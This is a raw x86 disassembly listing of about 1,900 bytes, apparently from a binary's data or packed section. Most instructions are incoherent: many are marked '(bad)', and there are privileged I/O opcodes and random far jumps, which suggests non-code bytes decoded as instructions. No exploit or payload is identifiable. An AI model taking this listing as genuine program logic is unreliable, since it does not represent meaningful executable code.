  40ca94:	add    BYTE PTR [ecx+0x28],dl
  40ca97:	sbb    eax,ebx
  40ca99:	int    0x8c
  40ca9b:	lods   eax,DWORD PTR ds:[esi]
  40ca9c:	or     ah,ah
  40ca9e:	fist   DWORD PTR [ecx+0x7b]
  40caa1:	ja     0x40ca69
  40caa3:	fwait
  40caa4:	push   ss
  40caa5:	jb     0x40ca42
  40caa7:	mov    eax,0xd3f6e839
  40caac:	sahf   
  40caad:	push   ss
  40caae:	cmp    edx,esp
  40cab0:	inc    ecx
  40cab1:	push   ds
  40cab2:	ins    DWORD PTR es:[edi],dx
  40cab3:	jmp    0x40cab1
  40cab5:	loop   0x40ca93
  40cab7:	loopne 0x40ca6f
  40cab9:	pop    edx
  40caba:	aad    0xb3
  40cabc:	int    0x46
  40cabe:	mov    ch,0xda
  40cac0:	push   ecx
  40cac1:	xchg   ecx,eax
  40cac2:	push   esi
  40cac3:	sbb    dh,BYTE PTR [ebp-0x42b8f3cf]
  40cac9:	inc    ebp
  40caca:	and    al,0x76
  40cacc:	sbb    eax,0x172cdfcd
  40cad1:	pop    esp
  40cad2:	mov    al,ds:0x1876bc17
  40cad7:	repnz push 0x7538ada6
  40cadd:	pop    es
  40cade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cadf:	mov    esi,0x934e76cd
  40cae4:	sbb    dl,BYTE PTR [eax]
  40cae6:	mov    dh,0x41
  40cae8:	cmp    al,0xa2
  40caea:	rcr    ebp,1
  40caec:	xchg   BYTE PTR [ebx+0x38],bh
  40caef:	cmp    edi,esi
  40caf1:	push   ebp
  40caf2:	nop
  40caf3:	push   esp
  40caf4:	(bad)  
  40caf5:	cmp    al,0x5c
  40caf7:	mov    ebp,0x5e08f68a
  40cafc:	ret    0xf738
  40caff:	jbe    0x40ca85
  40cb01:	fild   DWORD PTR [edx+edx*4+0x747a3309]
  40cb08:	out    0x53,eax
  40cb0a:	or     esi,DWORD PTR [ebx+0x1dcd44ae]
  40cb10:	aad    0x7f
  40cb12:	std    
  40cb13:	xlat   BYTE PTR ds:[ebx]
  40cb14:	inc    ebp
  40cb15:	mov    eax,0x439802b7
  40cb1a:	sub    DWORD PTR [ebx+0x6027de2c],0xffffff90
  40cb21:	sbb    DWORD PTR [esi-0x2],ebp
  40cb24:	or     edx,DWORD PTR [edi]
  40cb26:	mov    ds:0xe21a65d1,al
  40cb2b:	test   eax,0xcb3a73c4
  40cb30:	add    bh,dh
  40cb32:	ror    BYTE PTR [ebx],1
  40cb34:	push   eax
  40cb35:	xor    al,0xc1
  40cb37:	cmc    
  40cb38:	push   ebx
  40cb39:	mov    esp,ss
  40cb3b:	mov    edi,0x47b09168
  40cb40:	fiadd  DWORD PTR [ebp+0xa]
  40cb43:	or     al,0x8b
  40cb45:	sahf   
  40cb46:	out    dx,al
  40cb47:	xchg   esi,ebx
  40cb49:	aaa    
  40cb4a:	bound  ecx,QWORD PTR [esi]
  40cb4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb4d:	daa    
  40cb4e:	ss xor al,0x90
  40cb51:	ror    eax,0x52
  40cb54:	aam    0x4e
  40cb56:	pop    ebx
  40cb57:	pop    ebx
  40cb58:	clc    
  40cb59:	xchg   DWORD PTR [edi-0x773a109d],eax
  40cb5f:	shl    BYTE PTR [ecx-0x2c4f41a6],1
  40cb65:	(bad)  
  40cb66:	push   esi
  40cb67:	fs jle 0x40cb84
  40cb6a:	push   esp
  40cb6b:	push   ebp
  40cb6c:	ja     0x40cb92
  40cb6e:	ins    DWORD PTR es:[edi],dx
  40cb6f:	mov    cl,0x3f
  40cb71:	mov    cl,0x95
  40cb73:	aam    0x71
  40cb75:	push   edi
  40cb76:	sub    eax,edi
  40cb78:	daa    
  40cb79:	push   ebp
  40cb7a:	retf   0xa57a
  40cb7d:	sub    DWORD PTR [esp+edi*8-0x577960d0],edi
  40cb84:	sbb    eax,0x9547a8a1
  40cb89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb8a:	mov    ch,0x37
  40cb8c:	gs xchg ecx,eax
  40cb8e:	nop
  40cb8f:	ss ins BYTE PTR es:[edi],dx
  40cb91:	stc    
  40cb92:	mov    cl,0x26
  40cb94:	push   edi
  40cb95:	mov    esi,0x45e2bd97
  40cb9a:	fistp  WORD PTR [eax+0x5223b11f]
  40cba0:	mov    ds:0xa5f94bd,al
  40cba5:	sub    eax,0x2de7108c
  40cbaa:	push   esi
  40cbab:	js     0x40cc0d
  40cbad:	je     0x40cc24
  40cbaf:	sbb    al,0x31
  40cbb1:	fistp  WORD PTR [esi]
  40cbb3:	or     eax,0xcce4ce81
  40cbb8:	test   BYTE PTR [edx-0x5b],ah
  40cbbb:	imul   esp,DWORD PTR [ebx+0x23],0x1
  40cbbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbc0:	inc    BYTE PTR [ecx-0x14826c91]
  40cbc6:	pop    DWORD PTR [eax-0x7]
  40cbc9:	mov    ch,0x27
  40cbcb:	jae    0x40cb9b
  40cbcd:	xchg   ebx,eax
  40cbce:	cld    
  40cbcf:	inc    esp
  40cbd0:	adc    bl,BYTE PTR [edx-0xa]
  40cbd3:	pusha  
  40cbd4:	or     esi,DWORD PTR [eax-0x54]
  40cbd7:	js     0x40cb77
  40cbd9:	gs call ebx
  40cbdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbdd:	scas   eax,DWORD PTR es:[edi]
  40cbde:	pop    eax
  40cbdf:	test   DWORD PTR [ebp+0xe],eax
  40cbe2:	sar    DWORD PTR [eax],cl
  40cbe4:	js     0x40cc11
  40cbe6:	xchg   ebp,eax
  40cbe7:	cmp    BYTE PTR ds:0xbb956981,dh
  40cbed:	cmp    al,0x39
  40cbef:	mov    ?,esp
  40cbf1:	mov    bh,0x3a
  40cbf3:	dec    esp
  40cbf4:	push   eax
  40cbf5:	mov    edx,0xd071d8fb
  40cbfa:	sahf   
  40cbfb:	loope  0x40cbb1
  40cbfd:	sub    BYTE PTR [edx-0x12],ch
  40cc00:	bnd jns 0x40cc46
  40cc03:	div    bl
  40cc05:	arpl   WORD PTR [edi-0x60],bp
  40cc08:	mov    ebx,0xb4dde2a6
  40cc0d:	neg    al
  40cc0f:	ret    0x6721
  40cc12:	mov    al,ds:0x22ac6927
  40cc17:	mov    ?,WORD PTR [esi]
  40cc19:	xchg   DWORD PTR [ecx-0x40],ecx
  40cc1c:	fimul  DWORD PTR [ebp+0x5b]
  40cc1f:	or     dh,BYTE PTR es:[edx-0x4478bf89]
  40cc26:	cmp    dl,dh
  40cc28:	pop    edx
  40cc29:	and    BYTE PTR [eax+0x22],bh
  40cc2c:	aad    0xbe
  40cc2e:	rcl    BYTE PTR [esi],0x61
  40cc31:	push   edi
  40cc32:	les    ebx,FWORD PTR [edi]
  40cc34:	jnp    0x40cca3
  40cc36:	ins    DWORD PTR es:[edi],dx
  40cc37:	ja     0x40cca7
  40cc39:	iret   
  40cc3a:	btr    esi,ebx
  40cc3d:	mov    BYTE PTR [ecx+0x4ebe1c9f],cl
  40cc43:	push   esp
  40cc44:	inc    edx
  40cc45:	in     al,0xf
  40cc47:	fwait
  40cc48:	xchg   ebx,eax
  40cc49:	xchg   BYTE PTR [ecx+0x17c079],bh
  40cc4f:	xor    al,0xe
  40cc51:	cmp    eax,0x9ea62994
  40cc56:	(bad)  
  40cc57:	fld    QWORD PTR [ebx+eax*1-0x35]
  40cc5b:	fistp  WORD PTR [ecx]
  40cc5d:	push   ebp
  40cc5e:	and    al,BYTE PTR [eax]
  40cc60:	out    dx,eax
  40cc61:	mov    cl,0x7b
  40cc63:	sar    BYTE PTR [esi+0x33e6360f],0x3d
  40cc6a:	sbb    al,0xe0
  40cc6c:	push   ds
  40cc6d:	push   ds
  40cc6e:	in     al,dx
  40cc6f:	xchg   ecx,eax
  40cc70:	jmp    0x40ccdc
  40cc72:	test   cl,ah
  40cc74:	or     eax,0x90ddf47b
  40cc79:	adc    DWORD PTR ds:0x56ab82ec,edx
  40cc7f:	cwde   
  40cc80:	lahf   
  40cc81:	sub    esp,DWORD PTR ds:0x3d17a7ad
  40cc87:	xor    eax,0x5d257919
  40cc8c:	into   
  40cc8d:	adc    DWORD PTR [ebx+0x26],edi
  40cc90:	idiv   DWORD PTR [esi]
  40cc92:	mov    esp,0x413ae687
  40cc97:	mov    edx,0xe35f4357
  40cc9c:	dec    edi
  40cc9d:	or     al,0x9f
  40cc9f:	xor    eax,0x5d8b6fa2
  40cca4:	(bad)  
  40cca5:	hlt    
  40cca6:	dec    esi
  40cca7:	scas   eax,DWORD PTR es:[edi]
  40cca8:	push   0xa740169d
  40ccad:	jmp    0x40cd00
  40ccaf:	imul   edx,DWORD PTR ds:0x8e86c91,0xa6308edc
  40ccb9:	int    0xf9
  40ccbb:	in     eax,0x64
  40ccbd:	lock pop esp
  40ccbf:	and    ebp,DWORD PTR [edi-0x28af1508]
  40ccc5:	fst    QWORD PTR [eax]
  40ccc7:	addr16 cli 
  40ccc9:	pop    esp
  40ccca:	push   ecx
  40cccb:	add    ch,ah
  40cccd:	cs dec esi
  40cccf:	xor    al,0xb1
  40ccd1:	xchg   ecx,eax
  40ccd2:	or     BYTE PTR [eax-0x1b],bl
  40ccd5:	xchg   ecx,eax
  40ccd6:	sub    BYTE PTR [ebx-0x1d400893],0x7d
  40ccdd:	cmp    al,0xc0
  40ccdf:	fnsave [edi+eax*4]
  40cce2:	int3   
  40cce3:	push   esi
  40cce4:	cwde   
  40cce5:	and    DWORD PTR [ebp-0x7f],edx
  40cce8:	xor    al,0x94
  40ccea:	cmp    bl,dh
  40ccec:	push   ds
  40cced:	(bad)  
  40ccee:	mov    al,0x39
  40ccf0:	mov    ds:0xce0feac5,al
  40ccf5:	sbb    eax,0xa052c1dd
  40ccfa:	pop    ecx
  40ccfb:	bound  edx,QWORD PTR ds:0x438ef178
  40cd01:	mov    esi,0x1f811ad6
  40cd06:	ja     0x40cd84
  40cd08:	mov    ds:0x12962316,al
  40cd0d:	ins    DWORD PTR es:[edi],dx
  40cd0e:	cmp    BYTE PTR [eax],ch
  40cd10:	sub    al,0x93
  40cd12:	adc    DWORD PTR [edi],ecx
  40cd14:	pop    esp
  40cd15:	sub    edi,ecx
  40cd17:	mov    esp,0x5ca21f4
  40cd1c:	out    dx,al
  40cd1d:	xchg   edi,eax
  40cd1e:	out    0x2f,al
  40cd20:	mov    eax,ds:0x64b052fa
  40cd25:	jb     0x40cd05
  40cd27:	mov    ebp,0x11380be9
  40cd2c:	scas   al,BYTE PTR es:[edi]
  40cd2d:	mov    dh,0xe6
  40cd2f:	pop    ebx
  40cd30:	repz jno 0x40cd15
  40cd33:	mov    ecx,0x5ba17aa0
  40cd38:	es aam 0xdb
  40cd3b:	(bad)  
  40cd3c:	mov    fs,WORD PTR [ecx+0x1]
  40cd3f:	jle    0x40cd58
  40cd41:	cdq    
  40cd42:	stos   BYTE PTR es:[edi],al
  40cd43:	ins    BYTE PTR es:[edi],dx
  40cd44:	add    al,0xe8
  40cd46:	xor    al,BYTE PTR [ecx+0xf]
  40cd49:	jmp    FWORD PTR [ebx]
  40cd4b:	sbb    DWORD PTR [edx],ebx
  40cd4d:	xchg   esp,eax
  40cd4e:	popa   
  40cd4f:	cli    
  40cd50:	pushf  
  40cd51:	sbb    eax,DWORD PTR [ecx+0x34]
  40cd54:	ret    
  40cd55:	and    BYTE PTR [ebx+0x4],bh
  40cd58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd59:	sub    eax,0x3e05c7fc
  40cd5e:	in     al,0x70
  40cd60:	xchg   DWORD PTR [ebp-0x82a0907],eax
  40cd66:	add    eax,0xaafd9bc8
  40cd6b:	cmp    esp,DWORD PTR [ebp+0x56a50661]
  40cd71:	add    ch,BYTE PTR [ebx+0x50b8c34f]
  40cd77:	jne    0x40cd1a
  40cd79:	or     eax,0xc239865c
  40cd7e:	cwde   
  40cd7f:	test   DWORD PTR [esi+0x10],0x27409cbd
  40cd86:	retf   0xb799
  40cd89:	rcr    BYTE PTR [ecx+0x6f983582],1
  40cd8f:	mov    ecx,0x594c796f
  40cd94:	inc    ebx
  40cd95:	xchg   ebp,eax
  40cd96:	pop    esp
  40cd97:	push   cs
  40cd98:	hlt    
  40cd99:	sub    eax,0xb843ef59
  40cd9e:	shl    DWORD PTR [ebp+0x2af81a1c],1
  40cda4:	dec    BYTE PTR [edi+eiz*1+0x9]
  40cda8:	bnd je 0x40cd62
  40cdab:	imul   esp
  40cdad:	mov    ebp,0x1c637af2
  40cdb2:	fimul  DWORD PTR [esi+0x77]
  40cdb5:	in     al,dx
  40cdb6:	sbb    eax,0x82819d53
  40cdbb:	sbb    DWORD PTR [esi-0x9298d77],ebp
  40cdc1:	nop
  40cdc2:	xchg   edi,eax
  40cdc3:	push   edi
  40cdc4:	mov    WORD PTR ds:0x3305969e,es
  40cdca:	push   edx
  40cdcb:	mov    ecx,0x4d332603
  40cdd0:	sbb    DWORD PTR [esi+0x60],eax
  40cdd3:	pop    esp
  40cdd4:	shl    DWORD PTR cs:[edi+ebp*2],0x1c
  40cdd9:	pop    esp
  40cdda:	dec    eax
  40cddb:	leave  
  40cddc:	mov    bh,0x71
  40cdde:	sbb    BYTE PTR ds:0xbacc6f84,dh
  40cde4:	mov    ebx,0xbfabd6cc
  40cde9:	or     DWORD PTR [edx+eiz*1-0x80],esi
  40cded:	cmp    al,0x6f
  40cdef:	sub    edi,DWORD PTR [ebx-0x45]
  40cdf2:	fwait
  40cdf3:	xor    BYTE PTR [esi+eax*2-0x11],ah
  40cdf7:	jg     0x40cd87
  40cdf9:	imul   edx,eax,0xfffffff9
  40cdfc:	pop    ds
  40cdfd:	push   edi
  40cdfe:	(bad)  
  40cdff:	lods   eax,DWORD PTR ds:[esi]
  40ce00:	mov    ecx,DWORD PTR [esp+ebx*1+0x5c7aae37]
  40ce07:	sub    ah,BYTE PTR [ebx]
  40ce09:	xor    al,0x49
  40ce0b:	push   eax
  40ce0c:	retf   
  40ce0d:	cmp    BYTE PTR [ecx],al
  40ce0f:	sbb    al,BYTE PTR [edi+0x8663ba0]
  40ce15:	je     0x40ce1c
  40ce17:	cdq    
  40ce18:	dec    esi
  40ce19:	and    ah,cl
  40ce1b:	iret   
  40ce1c:	jle    0x40ce07
  40ce1e:	scas   eax,DWORD PTR es:[edi]
  40ce1f:	out    dx,eax
  40ce20:	jge    0x40ce2e
  40ce22:	xor    ah,BYTE PTR [esi-0x73f15d4f]
  40ce28:	xor    cl,ch
  40ce2a:	push   es
  40ce2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce2c:	lods   eax,DWORD PTR ds:[esi]
  40ce2d:	adc    al,0xba
  40ce2f:	and    dl,BYTE PTR [eax+0xe0d40f]
  40ce35:	ret    
  40ce36:	or     dl,BYTE PTR [esi]
  40ce38:	mov    ebp,edx
  40ce3a:	jl     0x40cea0
  40ce3c:	jb     0x40cdbf
  40ce3e:	and    eax,0x2ad9b385
  40ce43:	push   edx
  40ce44:	hlt    
  40ce45:	(bad)
  40ce48:	es or  eax,0x276be0f9
  40ce4e:	cmp    BYTE PTR [eax+0x45],0xa
  40ce52:	add    al,0xb2
  40ce54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce55:	mov    ch,0xa0
  40ce57:	(bad)  
  40ce58:	(bad)  
  40ce59:	stc    
  40ce5a:	shr    DWORD PTR [ebx+esi*4+0x7d908740],0x4
  40ce62:	xchg   edi,eax
  40ce63:	(bad)  [eax+0x4896accc]
  40ce69:	dec    edx
  40ce6a:	fst    st(2)
  40ce6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce6d:	imul   ebp,ebx,0xffffff96
  40ce70:	cmc    
  40ce71:	mov    ecx,0x3a10230
  40ce76:	in     eax,dx
  40ce77:	mov    cl,0xee
  40ce79:	pop    esi
  40ce7a:	xor    eax,0x1df8900
  40ce7f:	std    
  40ce80:	mov    esp,0xb10a55da
  40ce85:	and    ecx,DWORD PTR [esi+0x30a5c90e]
  40ce8b:	jmp    0x4a97:0x7403a78
  40ce92:	mov    ds:0x311a0007,eax
  40ce97:	push   ebp
  40ce98:	cmc    
  40ce99:	mov    si,0x32b8
  40ce9d:	jmp    0xee3b0cc6
  40cea2:	jg     0x40ceb2
  40cea4:	std    
  40cea5:	mov    esi,0xa28cfba2
  40ceaa:	(bad)  
  40ceab:	cdq    
  40ceac:	shr    dl,cl
  40ceae:	sbb    eax,0xe80fef0d
  40ceb3:	mov    esi,0xec25725d
  40ceb8:	sub    ebx,esp
  40ceba:	call   0x6fb4:0x35429770
  40cec1:	fs dec ebx
  40cec3:	and    dl,bh
  40cec5:	dec    edi
  40cec6:	gs mov ebp,0x66a155d3
  40cecc:	xor    eax,0xce029dca
  40ced1:	(bad)  
  40ced2:	xor    eax,0xefd72594
  40ced7:	(bad)  
  40ced8:	sti    
  40ced9:	jae    0x40cf36
  40cedb:	shr    ebp,cl
  40cedd:	icebp  
  40cede:	lods   al,BYTE PTR ds:[esi]
  40cedf:	fdivr  st,st(7)
  40cee1:	imul   ebx,DWORD PTR [edx],0x3d018f92
  40cee7:	or     ebx,ebx
  40cee9:	fisttp WORD PTR [esi-0x4e]
  40ceec:	fdivp  st(2),st
  40ceee:	or     edi,DWORD PTR [ebp-0x31]
  40cef1:	sub    cl,BYTE PTR [ecx+0x6caebb58]
  40cef7:	repz xchg ebp,eax
  40cef9:	pop    edx
  40cefa:	call   0x5c05b7c0
  40ceff:	mov    DWORD PTR [edi+0x3f],ecx
  40cf02:	xchg   esi,eax
  40cf03:	xor    ah,ah
  40cf05:	jne    0x40cf86
  40cf07:	fmulp  st(2),st
  40cf09:	inc    ecx
  40cf0a:	mov    bl,0x77
  40cf0c:	push   0xd01bcb37
  40cf11:	dec    esp
  40cf12:	jl     0x40ceb8
  40cf14:	(bad)  
  40cf15:	frstor [ecx]
  40cf17:	mov    dl,0xe9
  40cf19:	and    al,0x15
  40cf1b:	fimul  WORD PTR [ebp+edx*1-0x3878f034]
  40cf22:	or     DWORD PTR [edi-0x13],ebx
  40cf25:	shl    BYTE PTR [edx+0x159d9be1],1
  40cf2b:	cmp    BYTE PTR [eax+0x69f7772d],ah
  40cf31:	pop    ss
  40cf32:	add    edi,DWORD PTR [edi+0x6ab92f4f]
  40cf38:	inc    ecx
  40cf39:	sbb    DWORD PTR [esp+esi*1-0x7d],edx
  40cf3d:	sub    eax,0xd987607a
  40cf42:	repz push esi
  40cf44:	pop    esi
  40cf45:	pop    eax
  40cf46:	push   edx
  40cf47:	ss push esp
  40cf49:	repnz inc ebp
  40cf4b:	mov    eax,0x937df81a
  40cf50:	leave  
  40cf51:	cmp    BYTE PTR [eax-0x4b],cl
  40cf54:	mov    ds:0x76b2da42,al
  40cf59:	xchg   esi,eax
  40cf5a:	jno    0x40cfcf
  40cf5c:	xchg   esp,eax
  40cf5d:	mov    edi,0xd2ad7c8e
  40cf62:	ret    0x9db4
  40cf65:	adc    ebx,edi
  40cf67:	dec    DWORD PTR [edx+ebx*4+0x803379d]
  40cf6e:	pop    ecx
  40cf6f:	push   ecx
  40cf70:	sbb    eax,DWORD PTR [ecx]
  40cf72:	arpl   WORD PTR [ebp+0x2b],di
  40cf75:	stos   DWORD PTR es:[edi],eax
  40cf76:	in     al,dx
  40cf77:	push   esi
  40cf78:	test   eax,0x33d103a8
  40cf7d:	ror    DWORD PTR [ebx+0x4340141d],cl
  40cf83:	add    BYTE PTR [ecx],cl
  40cf85:	sbb    eax,0x436018
  40cf8a:	mov    DWORD PTR [ebp-0x50],edx
  40cf8d:	mov    edx,DWORD PTR [ebp+0x8]
  40cf90:	mov    ebx,DWORD PTR ds:0x434020
  40cf96:	sbb    DWORD PTR ds:0x43401c,ebx
  40cf9c:	mov    ebx,DWORD PTR [ebp-0x4c]
  40cf9f:	jmp    0x40f353
  40cfa4:	mov    DWORD PTR [edi+0x2c],0x73f3ac7a
  40cfab:	ret    
  40cfac:	xchg   esp,eax
  40cfad:	cs or  al,0xd2
  40cfb0:	jmp    0x40cf3c
  40cfb2:	add    BYTE PTR [eiz*2-0x1483831e],ah
  40cfb9:	pop    edi
  40cfba:	jl     0x40d038
  40cfbc:	or     eax,0x688b0429
  40cfc1:	js     0x40cfc0
  40cfc3:	aas    
  40cfc4:	push   esp
  40cfc5:	mov    eax,ds:0x42b9065a
  40cfca:	xor    cl,BYTE PTR [ebx+0x1fc60c54]
  40cfd0:	cmp    dh,bh
  40cfd2:	adc    dl,bh
  40cfd4:	in     eax,dx
  40cfd5:	jbe    0x40d023
  40cfd7:	ja     0x40cf80
  40cfd9:	stos   DWORD PTR es:[edi],eax
  40cfda:	mov    eax,ds:0x78d3a06c
  40cfdf:	mov    ecx,0xcc477877
  40cfe4:	dec    ebx
  40cfe5:	jne    0x40d048
  40cfe7:	call   0x37c:0x1b1b2016
  40cfee:	jo     0x40d037
  40cff0:	js     0x40d054
  40cff2:	stc    
  40cff3:	cdq    
  40cff4:	add    BYTE PTR [ecx+0x1fb0bbc2],bl
  40cffa:	push   ecx
  40cffb:	test   BYTE PTR [ecx-0x9],ah
  40cffe:	mov    cl,0xdf
  40d000:	fldcw  WORD PTR [edx]
  40d002:	inc    edx
  40d003:	adc    BYTE PTR [eax+0x566dd1d3],cl
  40d009:	dec    ebp
  40d00a:	and    eax,0x883156a
  40d00f:	loopne 0x40cfac
  40d011:	mov    cl,BYTE PTR [edx+0x14269386]
  40d017:	stc    
  40d018:	push   ebp
  40d019:	jecxz  0x40d058
  40d01b:	pushf  
  40d01c:	mov    al,ds:0x9e78333f
  40d021:	and    dh,dh
  40d023:	xlat   BYTE PTR ds:[ebx]
  40d024:	sahf   
  40d025:	inc    eax
  40d026:	dec    ebp
  40d027:	imul   BYTE PTR [esi]
  40d029:	test   al,0x68
  40d02b:	mov    edx,0xf6400e7e
  40d030:	call   0x8e5a846e
  40d035:	retf   
  40d036:	adc    al,ch
  40d038:	(bad)  
  40d039:	cmp    DWORD PTR [esp+edi*2-0x42],edi
  40d03d:	int3   
  40d03e:	lods   al,BYTE PTR ds:[esi]
  40d03f:	shr    BYTE PTR [ebx],0x3d
  40d042:	shl    DWORD PTR [edx+0x5ef9366d],cl
  40d048:	jg     0x40d009
  40d04a:	lock fwait
  40d04c:	jg     0x40d033
  40d04e:	aam    0x68
  40d050:	pop    esi
  40d051:	fs nop
  40d053:	push   es
  40d054:	ins    BYTE PTR es:[edi],dx
  40d055:	mov    ds:0xb8e51803,eax
  40d05a:	dec    eax
  40d05b:	fcomp  QWORD PTR [edi+0x29]
  40d05e:	inc    edi
  40d05f:	add    al,0xe6
  40d061:	outs   dx,BYTE PTR ds:[esi]
  40d062:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d063:	mov    al,ds:0x209f6881
  40d068:	or     eax,DWORD PTR [eax-0x1b]
  40d06b:	imul   ebp,esp,0xffffff92
  40d06e:	jo     0x40d0e5
  40d070:	sahf   
  40d071:	sahf   
  40d072:	std    
  40d073:	in     al,0x4c
  40d075:	outs   dx,DWORD PTR ss:[esi]
  40d077:	call   0x772d:0xa2deee55
  40d07e:	or     esi,DWORD PTR [eax]
  40d080:	jmp    0x40d04e
  40d082:	xor    eax,0xb83cda91
  40d087:	adc    BYTE PTR [ebx],bh
  40d089:	sbb    esp,DWORD PTR [ebx]
  40d08b:	add    al,0x71
  40d08d:	pusha  
  40d08e:	xor    cl,BYTE PTR [ebx]
  40d090:	sub    ah,BYTE PTR [ecx+0x26]
  40d093:	aaa    
  40d094:	rcl    BYTE PTR [ebx+0xf36ed2d],1
  40d09a:	outs   dx,BYTE PTR ds:[esi]
  40d09b:	(bad)  
  40d09c:	ins    DWORD PTR es:[edi],dx
  40d09d:	loop   0x40d0e3
  40d09f:	xchg   edx,eax
  40d0a0:	or     eax,0xa715c4c4
  40d0a5:	ins    DWORD PTR es:[edi],dx
  40d0a6:	(bad)  
  40d0a7:	bound  ebx,QWORD PTR [esi+0x2c7ae0bf]
  40d0ad:	push   ebx
  40d0ae:	mov    bl,BYTE PTR [ecx+0x2a63f320]
  40d0b4:	sub    bl,BYTE PTR [edx-0x7f519bb9]
  40d0ba:	sbb    ebx,DWORD PTR [esi-0x482b0f4a]
  40d0c0:	imul   ecx,ebp,0x5f8b68f6
  40d0c6:	push   es
  40d0c7:	jb     0x40d0ed
  40d0c9:	sub    eax,0xc570d702
  40d0ce:	bound  esp,QWORD PTR gs:[ecx+eax*8-0x2e]
  40d0d3:	popa   
  40d0d4:	push   edx
  40d0d5:	add    BYTE PTR gs:[edi-0x546545f4],bl
  40d0dc:	in     eax,0x67
  40d0de:	cmp    cl,0x7a
  40d0e1:	xor    DWORD PTR [edx+0xa137ade],edx
  40d0e7:	push   esp
  40d0e8:	jmp    0x2425:0xcaf9f2f6
  40d0ef:	xor    bl,cl
  40d0f1:	test   al,0x53
  40d0f3:	xchg   ebx,eax
  40d0f4:	enter  0x1a75,0x3f
  40d0f8:	jns    0x40d15d
  40d0fa:	fwait
  40d0fb:	fs hlt 
  40d0fd:	cmc    
  40d0fe:	or     DWORD PTR [ecx-0x71],edx
  40d101:	(bad)  
  40d102:	or     bl,cl
  40d104:	jle    0x40d10a
  40d106:	sbb    al,0xf0
  40d108:	mov    edi,0xad1f379d
  40d10d:	sub    DWORD PTR [edi],ebx
  40d10f:	fisttp WORD PTR [esi-0x28]
  40d112:	retf   
  40d113:	dec    ebp
  40d114:	out    dx,eax
  40d115:	adc    DWORD PTR [edx+0x49a054b0],0x9318260a
  40d11f:	mov    al,ds:0x914e5831
  40d124:	jge    0x40d114
  40d126:	sub    al,0xa9
  40d128:	or     DWORD PTR [edx],ebx
  40d12a:	inc    edi
  40d12b:	jae    0x40d1ac
  40d12d:	sbb    esp,esp
  40d12f:	imul   DWORD PTR ds:[ecx-0x6d]
  40d133:	push   esp
  40d134:	enter  0xd947,0x9a
  40d138:	adc    dh,BYTE PTR [eax+0x6e783239]
  40d13e:	push   edx
  40d13f:	adc    esp,DWORD PTR [ecx]
  40d141:	xchg   eax,ecx
  40d143:	ror    BYTE PTR [ecx+0x2609d113],0x21
  40d14a:	add    al,0x80
  40d14c:	adc    ebx,DWORD PTR [ecx+0x4f]
  40d14f:	aad    0xc1
  40d151:	cmp    al,0xb3
  40d153:	stos   BYTE PTR es:[edi],al
  40d154:	inc    ecx
  40d155:	(bad)  
  40d156:	int3   
  40d157:	mov    dl,0x64
  40d159:	fnstsw WORD PTR [edi]
  40d15b:	call   0xf381:0x145f97f6
  40d162:	fiadd  WORD PTR [ecx]
  40d164:	div    BYTE PTR [ecx+0x1d]
  40d167:	mov    ?,WORD PTR [ecx+0x7e1519e3]
  40d16d:	or     BYTE PTR [edx+ebx*8+0x76],bh
  40d171:	inc    ebx
  40d172:	(bad)  
  40d175:	xchg   esi,eax
  40d177:	stos   DWORD PTR es:[edi],eax
  40d178:	push   0xffffff88
  40d17a:	retf   0xac12
  40d17d:	sub    esi,DWORD PTR [esi+0x78]
  40d180:	cld    
  40d181:	sbb    eax,0xda44ea03
  40d186:	xor    edi,DWORD PTR [ecx+0x1f]
  40d189:	sbb    cl,dh
  40d18b:	maskmovq mm3,(bad)
  40d18c:	neg    DWORD PTR [eax]
  40d18e:	pushf  
  40d18f:	add    al,0xb2
  40d191:	pop    esp
  40d192:	pop    es
  40d193:	call   0x482922ca
  40d198:	dec    edi
  40d199:	pop    ecx
  40d19a:	mov    ebx,0x529b9afd
  40d19f:	inc    esp
  40d1a0:	(bad)  
  40d1a1:	retf   
  40d1a2:	pop    edx
  40d1a3:	push   ecx
  40d1a4:	retf   
  40d1a5:	test   eax,0xa5fa72d1
  40d1aa:	jne    0x40d1d5
  40d1ac:	out    0x6b,al
  40d1ae:	jae    0x40d183
  40d1b0:	pop    ecx
  40d1b1:	neg    BYTE PTR [esi-0x5205fd71]
  40d1b7:	outs   dx,DWORD PTR ds:[esi]
  40d1b8:	or     dh,BYTE PTR [ebp+eax*4+0x61]
  40d1bc:	je     0x40d1b3
  40d1be:	out    0x16,al
  40d1c0:	dec    ebx
  40d1c1:	sar    DWORD PTR [esi],1
  40d1c3:	pop    ds
  40d1c4:	dec    edx
  40d1c5:	clts   
  40d1c7:	inc    ebp
  40d1c8:	fdiv   DWORD PTR [ebx+ebp*2]
  40d1cb:	add    bh,ch
  40d1cd:	std    
  40d1ce:	xchg   BYTE PTR fs:[ebp-0x7abe81b8],cl
  40d1d5:	das    
  40d1d6:	cwde   
  40d1d7:	cli    
  40d1d8:	push   ecx
  40d1d9:	xor    ebp,0x6ff759c7
  40d1df:	imul   BYTE PTR [ecx-0x5bcc079f]
  40d1e5:	dec    edi
  40d1e6:	mov    bh,0x22
  40d1e8:	popa   
  40d1e9:	dec    eax
  40d1ea:	es push cs
  40d1ec:	adc    esp,DWORD PTR [eax-0x39]
  40d1ef:	call   DWORD PTR [edx+0x4f]
  40d1f2:	psrad  mm4,QWORD PTR [ebp-0x3ca94303]
  40d1f9:	adc    DWORD PTR [ecx+0x48],esp
  40d1fc:	retf   
  40d1fd:	cs in  al,dx
  40d1ff:	arpl   cx,sp
  40d201:	mov    ?,WORD PTR [ebp+eax*2+0x3]
  40d205:	icebp  
  40d206:	adc    BYTE PTR [edi],0x96
  40d209:	jae    0x40d258
  40d20b:	popf   
  40d20c:	sub    dl,BYTE PTR ds:[edi-0x4c]
  40d210:	shl    BYTE PTR [edi+ecx*4-0x6294625f],1
  40d217:	ret    0x107e
  40d21a:	xchg   edx,eax
  40d21b:	in     al,0xf5
  40d21d:	adc    al,0xc4
  40d21f:	jae    0x40d21e
